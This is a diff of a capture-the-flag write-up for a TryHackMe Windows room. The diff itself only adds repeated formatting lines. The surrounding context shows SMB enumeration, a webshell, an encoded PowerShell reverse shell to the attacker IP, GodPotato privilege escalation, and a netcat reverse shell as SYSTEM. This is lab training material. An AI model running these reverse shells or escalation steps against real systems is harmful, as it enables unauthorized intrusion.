@@ -14,6 +14,7 @@ image:
 
 ```
 {: .nolineno}
+{: .nolineno}
 ## FTP Enumeration 🔽
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
@@ -41,6 +42,7 @@ ftp> exit
 221 Goodbye.
 ```
 {: .nolineno}
+{: .nolineno}
 ## Web Enumeration ⤵️
 
 I opened the `notice.txt` file and here is some hints ->
@@ -57,6 +59,7 @@ of images.
 - Dev Team 
 ```
 {: .nolineno}
+{: .nolineno}
 Lets do some digging into the SMB Shares and I got these shares which are hidden ->
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
@@ -72,6 +75,7 @@ Password for [WORKGROUP\kali]:
 	IPC$            IPC       Remote IPC
 	Users           Disk      
 ```
+{: .nolineno}
 {: .nolineno}
 I then accessed the images$ share and got these images that images can be found from the web also like this ->
 ![Image](Pasted%20image%2020240221213109.png)
@@ -96,6 +100,7 @@ smb: \> ls
 		10861311 blocks of size 4096. 4124853 blocks available
 smb: \> 
 ```
+{: .nolineno}
 {: .nolineno}
 Now lets access the <span style="color:#00ff91">webshell</span> from the site , I then performed the reverse shell command through this script file ->
 ![Image](Pasted%20image%2020240221213421.png)
@@ -130,12 +135,14 @@ b64 = base64.b64encode(byte)
 print("powershell -exec bypass -enc %s" % b64.decode())
 ```
 {: .nolineno}
+{: .nolineno}
 {: file=payload.py}
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/AllSignPoint2Pwnage]
 └─$ python3 payload.py 10.14.72.139 4444
 powershell -exec bypass -enc CgAkAGMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABDAFAAQwBsAGkAZQBuAHQAKAAnADEAMAAuADEANAAuADcAMgAuADEAMwA5ACcALAA0ADQANAA0ACkAOwAKACQAcwAgAD0AIAAkAGMALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwAuAFIAZQBhAGQAKAAkAGIALAAgADAALAAgACQAYgAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsACgAgACAAIAAgACQAZAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACAAJABpACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABpAGUAeAAgACQAZAAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAKACAAIAAgACAAJABzAGIAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAYgAgACsAIAAnAHAAcwA+ACAAJwApADsACgAgACAAIAAgACQAcwAuAFcAcgBpAHQAZQAoACQAcwBiACwAMAAsACQAcwBiAC4ATABlAG4AZwB0AGgAKQA7AAoAIAAgACAAIAAkAHMALgBGAGwAdQBzAGgAKAApAAoAfQA7AAoAJABjAC4AQwBsAG8AcwBlACgAKQAKAA==
 ```
+{: .nolineno}
 {: .nolineno}
 Now lets have a shell ->
 ![Image](Pasted%20image%2020240221213749.png)
@@ -199,6 +206,7 @@ C:.
 ps>
 ```
 {: .nolineno}
+{: .nolineno}
 I checked the privileges this user has and I got this ->
 ```powershell
 ps> whoami /all
@@ -244,6 +252,7 @@ SeTimeZonePrivilege           Change the time zone                      Disabled
 ps>
 ```
 {: .nolineno}
+{: .nolineno}
 So this user have <span style="color:#ffff00">SeImpersonatePrivilege</span> Enabled so lets use that privilege to escalate to Administraotor user.
 I will be using <span style="color:#fd77f8">God Potato</span> Tool to perform this attack ->
 ```powershell
@@ -278,6 +287,7 @@ ps> .\GodPotato-NET4.exe -cmd "cmd /c whoami"
 ps>
 ```
 {: .nolineno}
+{: .nolineno}
 It is working fine so lets have a reverse shell of  `NT AUTHORITY\SYSTEM` user ->
 ```powershell
 ps> .\GodPotato-NET4.exe -cmd "cmd /c C:\Users\sign\nc64.exe 10.14.72.139 2222 -e cmd"
@@ -308,6 +318,7 @@ ps> .\GodPotato-NET4.exe -cmd "cmd /c C:\Users\sign\nc64.exe 10.14.72.139 2222 -
 [*] process start with pid 6660
 ps>
 ```
+{: .nolineno}
 {: .nolineno}
 In the netcat listener I got the reverse shell captured like this but the AV or Defender does not allow me to execute `whoami` command ->
 
@@ -371,6 +382,7 @@ type Desktop\admin_flag.txt
 thm{FLAG_FLAG_FLAG_FLAG_FLAG}
 C:\Users\Administrator>
 ```
+{: .nolineno}
 {: .nolineno}
 I am Administrator Now !!
 
